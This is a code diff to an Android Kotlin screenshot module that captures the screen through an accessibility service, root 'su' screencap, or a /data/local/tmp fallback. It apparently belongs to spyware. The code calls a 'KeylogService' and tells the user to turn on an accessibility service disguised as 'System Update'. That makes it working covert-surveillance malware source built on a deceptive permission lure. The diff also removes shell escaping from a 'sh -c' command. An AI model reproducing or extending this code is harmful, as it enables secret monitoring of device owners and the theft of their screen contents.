@@ -26,58 +26,60 @@ class ScreenshotModule(private val context: android.content.Context) {
     fun capture(callback: Callback) {
         Log.d(TAG, "start")
 
-        val tmpDir = context.cacheDir.resolve("ss").also { it.mkdirs() }
-        val tmpFile = File(tmpDir, "screen_${System.currentTimeMillis()}.png")
+        // 1. AccessibilityService (Android 14+) — most reliable on modern devices
+        if (Build.VERSION.SDK_INT >= 34) {
+            Log.d(TAG, "trying accessibility")
+            val svc = KeylogService.instance
+            if (svc != null) {
+                captureAccessibility(callback)
+                return
+            }
+            Log.d(TAG, "accessibility service not available")
+        }
 
-        // 1. Direct screencap (works on emulator without root)
+        // 2. Direct screencap — works on rooted devices or some emulators
         Log.d(TAG, "trying direct screencap")
-        val directResult = captureDirect(tmpFile)
+        val directResult = captureDirect()
         if (directResult != null) {
             val processed = processBytes(directResult)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        // 2. Root (emulator with su)
-        Log.d(TAG, "trying root")
-        val rootResult = captureRoot(tmpFile)
+        // 3. Root screencap
+        Log.d(TAG, "trying root screencap")
+        val rootResult = captureRoot()
         if (rootResult != null) {
             val processed = processBytes(rootResult)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        // 3. ADB (emulator)
-        Log.d(TAG, "trying adb")
-        val adbResult = captureADB(tmpFile)
-        if (adbResult != null) {
-            val processed = processBytes(adbResult)
+        // 4. Screencap via /data/local/tmp (emulator workaround)
+        Log.d(TAG, "trying tmp screencap")
+        val tmpResult = captureViaTmp()
+        if (tmpResult != null) {
+            val processed = processBytes(tmpResult)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        // 4. AccessibilityService (Android 14+)
-        if (Build.VERSION.SDK_INT >= 34 && KeylogService.isRunning) {
-            Log.d(TAG, "trying accessibility")
-            captureAccessibility(callback)
-            return
+        val hint = if (Build.VERSION.SDK_INT >= 34) {
+            "Enable Accessibility Service: Settings → Accessibility → System Update → ON"
+        } else {
+            "Requires root. On emulator: enable root in AVD settings or use Android 14+ with Accessibility"
         }
-
-        Log.d(TAG, "all methods failed")
-        callback.onFailure("No screenshot method available. Need: Root, ADB, or AccessibilityService")
+        callback.onFailure("Screenshot failed. $hint")
     }
 
-    private fun shellEscape(path: String): String {
-        return path.replace("'", "'\\''")
-    }
-
-    private fun captureDirect(tmpFile: File): ByteArray? {
+    private fun captureDirect(): ByteArray? {
         return try {
-            val proc = ProcessBuilder("sh", "-c", "screencap -p '${shellEscape(tmpFile.absolutePath)}'")
-                .redirectErrorStream(true).start()
+            // Try screencap to stdout (pipe)
+            val proc = ProcessBuilder("sh", "-c", "screencap -p")
+                .redirectErrorStream(true)
+                .start()
             val ok = proc.waitFor(10, TimeUnit.SECONDS)
             if (!ok) { proc.destroyForcibly(); return null }
             if (proc.exitValue() != 0) return null
-            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
-            val bytes = tmpFile.readBytes()
-            tmpFile.delete()
+            val bytes = proc.inputStream.readBytes()
+            if (bytes.isEmpty() || bytes.size < 100) return null
             bytes
         } catch (e: Exception) {
             Log.e(TAG, "Direct failed: ${e.message}")
@@ -85,16 +87,16 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
     }
 
-    private fun captureRoot(tmpFile: File): ByteArray? {
+    private fun captureRoot(): ByteArray? {
         return try {
-            val proc = ProcessBuilder("su", "-c", "screencap -p '${shellEscape(tmpFile.absolutePath)}'")
-                .redirectErrorStream(true).start()
+            val proc = ProcessBuilder("su", "-c", "screencap -p")
+                .redirectErrorStream(true)
+                .start()
             val ok = proc.waitFor(10, TimeUnit.SECONDS)
             if (!ok) { proc.destroyForcibly(); return null }
             if (proc.exitValue() != 0) return null
-            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
-            val bytes = tmpFile.readBytes()
-            tmpFile.delete()
+            val bytes = proc.inputStream.readBytes()
+            if (bytes.isEmpty() || bytes.size < 100) return null
             bytes
         } catch (e: Exception) {
             Log.e(TAG, "Root failed: ${e.message}")
@@ -102,31 +104,25 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
     }
 
-    private fun captureADB(tmpFile: File): ByteArray? {
+    private fun captureViaTmp(): ByteArray? {
         return try {
-            val dirs = listOf(
-                File("/sdcard"),
-                File("/storage/emulated/0"),
-                context.cacheDir.resolve("ss").also { it.mkdirs() }
-            )
-            for (dir in dirs) {
-                try {
-                    dir.mkdirs()
-                    val f = File(dir, "screen.png")
-                    val proc = ProcessBuilder("sh", "-c", "screencap -p '${shellEscape(f.absolutePath)}'")
-                        .redirectErrorStream(true).start()
-                    val ok = proc.waitFor(10, TimeUnit.SECONDS)
-                    if (ok && proc.exitValue() == 0 && f.exists() && f.length() > 0) {
-                        val bytes = f.readBytes()
-                        f.delete()
-                        return bytes
-                    }
-                    proc.destroyForcibly()
-                } catch (_: Exception) {}
+            val tmpFile = File("/data/local/tmp/screen_${System.currentTimeMillis()}.png")
+            // Try to screencap to /data/local/tmp which is world-writable on some emulators
+            val proc = ProcessBuilder("sh", "-c", "screencap -p ${tmpFile.absolutePath}")
+                .redirectErrorStream(true)
+                .start()
+            val ok = proc.waitFor(10, TimeUnit.SECONDS)
+            if (!ok || proc.exitValue() != 0) {
+                proc.destroyForcibly()
+                return null
             }
-            null
+            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
+            val bytes = tmpFile.readBytes()
+            tmpFile.delete()
+            if (bytes.isEmpty() || bytes.size < 100) return null
+            bytes
         } catch (e: Exception) {
-            Log.e(TAG, "ADB failed: ${e.message}")
+            Log.e(TAG, "Tmp failed: ${e.message}")
             null
         }
     }
@@ -141,31 +137,36 @@ class ScreenshotModule(private val context: android.content.Context) {
             return
         }
         val exec = Executors.newSingleThreadExecutor()
-        svc.takeScreenshot(
-            android.view.Display.DEFAULT_DISPLAY,
-            exec,
-            object : AccessibilityService.TakeScreenshotCallback {
-                override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
-                    try {
-                        val bitmap = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
-                        if (bitmap == null) { callback.onFailure("Bitmap wrap failed"); exec.shutdown(); return }
-                        val bytes = ByteArrayOutputStream()
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, bytes)
-                        bitmap.recycle()
-                        callback.onSuccess(bytes.toByteArray())
-                    } catch (e: Exception) {
-                        callback.onFailure("Accessibility: ${e.message}")
-                    } finally {
+        try {
+            svc.takeScreenshot(
+                android.view.Display.DEFAULT_DISPLAY,
+                exec,
+                object : AccessibilityService.TakeScreenshotCallback {
+                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
+                        try {
+                            val bitmap = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
+                            if (bitmap == null) { callback.onFailure("Bitmap wrap failed"); return }
+                            val bytes = ByteArrayOutputStream()
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, bytes)
+                            bitmap.recycle()
+                            callback.onSuccess(bytes.toByteArray())
+                        } catch (e: Exception) {
+                            callback.onFailure("Accessibility: ${e.message}")
+                        } finally {
+                            exec.shutdown()
+                        }
+                    }
+
+                    override fun onFailure(errorCode: Int) {
+                        callback.onFailure("Accessibility screenshot failed: code=$errorCode")
                         exec.shutdown()
                     }
                 }
-
-                override fun onFailure(errorCode: Int) {
-                    callback.onFailure("Accessibility screenshot failed: code=$errorCode")
-                    exec.shutdown()
-                }
-            }
-        )
+            )
+        } catch (e: Exception) {
+            callback.onFailure("Accessibility: ${e.message}")
+            exec.shutdown()
+        }
     }
 
     private fun processBytes(data: ByteArray): ByteArray? {
